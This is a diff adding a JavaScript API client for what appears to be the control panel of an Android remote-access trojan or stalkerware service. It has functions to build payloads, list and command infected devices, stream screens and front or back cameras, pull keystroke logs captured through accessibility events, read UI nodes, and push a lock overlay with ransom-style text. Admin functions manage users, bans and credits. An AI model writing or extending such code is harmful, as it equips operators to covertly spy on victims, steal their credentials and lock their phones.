@@ -1,0 +1,108 @@
+// API-backed store. Session token in localStorage. Everything else fetched live.
+const SESSION_KEY = 'ak_session';
+const USER_KEY    = 'ak_user';
+
+export function getSession() { return localStorage.getItem(SESSION_KEY) || ''; }
+export function getUser()    { try { return JSON.parse(localStorage.getItem(USER_KEY) || 'null'); } catch { return null; } }
+export function isAdmin()    { return !!(getUser()?.isAdmin); }
+export function isLoggedIn() { return !!getSession() && !!getUser(); }
+
+async function api(path, opts = {}) {
+  const isForm = (typeof FormData !== 'undefined') && (opts.body instanceof FormData);
+  const headers = isForm
+    ? { ...(opts.headers || {}) }
+    : { 'Content-Type': 'application/json', ...(opts.headers || {}) };
+  const sess = getSession();
+  if (sess) headers['Authorization'] = 'Bearer ' + sess;
+  const r = await fetch(path, { ...opts, headers });
+  let body = {};
+  try { body = await r.json(); } catch {}
+  if (!r.ok) {
+    const err = new Error(body.error || ('http ' + r.status));
+    err.status = r.status; err.body = body;
+    throw err;
+  }
+  return body;
+}
+
+export async function login(username, password) {
+  try {
+    const res = await api('/api/auth/login', { method: 'POST', body: JSON.stringify({ username, password }) });
+    localStorage.setItem(SESSION_KEY, res.session);
+    localStorage.setItem(USER_KEY, JSON.stringify(res.user));
+    return { ok: true, user: res.user };
+  } catch (e) {
+    return { ok: false, reason: e.body?.reason || 'invalid' };
+  }
+}
+
+export async function logout() {
+  try { await api('/api/auth/logout', { method: 'POST' }); } catch {}
+  localStorage.removeItem(SESSION_KEY);
+  localStorage.removeItem(USER_KEY);
+}
+
+export async function refreshMe() {
+  try {
+    const res = await api('/api/auth/me');
+    localStorage.setItem(USER_KEY, JSON.stringify(res.user));
+    return res.user;
+  } catch { return null; }
+}
+
+// Admin: users
+export async function listUsers()                 { return (await api('/api/admin/users')).users; }
+export async function createUser(payload)         { return await api('/api/admin/users', { method: 'POST', body: JSON.stringify(payload) }); }
+export async function deleteUserApi(username)     { return await api('/api/admin/users/' + encodeURIComponent(username), { method: 'DELETE' }); }
+export async function setUserBannedApi(u, banned) { return await api('/api/admin/users/' + encodeURIComponent(u) + '/ban', { method: 'PUT', body: JSON.stringify({ banned }) }); }
+export async function setUserCredits(u, credits)  { return await api('/api/admin/users/' + encodeURIComponent(u) + '/credits', { method: 'PUT', body: JSON.stringify({ credits }) }); }
+
+// Devices
+export async function listDevices()              { return await api('/api/devices'); }
+export async function deleteDevice(id)           { return await api('/api/devices/' + encodeURIComponent(id), { method: 'DELETE' }); }
+
+// Build
+export async function startBuild(formData) {
+  const opts = { method: 'POST' };
+  if (formData) opts.body = formData;   // FormData → multipart, browser sets Content-Type
+  return await api('/api/build', opts);
+}
+export async function buildStatus(id)             { return await api('/api/build/' + id + '/status'); }
+
+// Device detail + control
+export async function getDevice(id)               { return await api('/api/devices/' + encodeURIComponent(id)); }
+export async function setStream(id, enable)       { return await api('/api/devices/' + encodeURIComponent(id) + '/stream', { method: 'POST', body: JSON.stringify({ enable }) }); }
+export async function sendCommand(id, type, params = {}) {
+  return await api('/api/devices/' + encodeURIComponent(id) + '/command', { method: 'POST', body: JSON.stringify({ type, params }) });
+}
+
+export async function setLockOverlay(id, on, text) {
+  return await sendCommand(id, 'lock_overlay', { on: !!on, text: String(text || '') });
+}
+export function screenshotUrl(id, tick) { return '/api/devices/' + encodeURIComponent(id) + '/screenshot?t=' + (tick || Date.now()); }
+
+// Key logs (admin/owner): live captured text from accessibility events
+export async function getKeyLogs(id, since = 0, limit = 500) {
+  const q = '?limit=' + limit + (since > 0 ? '&since=' + since : '');
+  return await api('/api/devices/' + encodeURIComponent(id) + '/keylogs' + q);
+}
+export async function clearKeyLogs(id) {
+  return await api('/api/devices/' + encodeURIComponent(id) + '/keylogs', { method: 'DELETE' });
+}
+
+export async function setNodesStream(id, on) {
+  return await api('/api/devices/' + encodeURIComponent(id) + '/nodes-stream', { method: 'POST', body: JSON.stringify({ on: !!on }) });
+}
+export async function getNodes(id) {
+  return await api('/api/devices/' + encodeURIComponent(id) + '/nodes');
+}
+
+export async function setCameraStream(id, on, lens) {
+  return await api('/api/devices/' + encodeURIComponent(id) + '/camera-stream', {
+    method: 'POST',
+    body: JSON.stringify({ on: !!on, lens: lens === 'front' ? 'front' : 'back' })
+  });
+}
+export function cameraUrl(id, tick) {
+  return '/api/devices/' + encodeURIComponent(id) + '/camera?t=' + (tick || Date.now());
+}
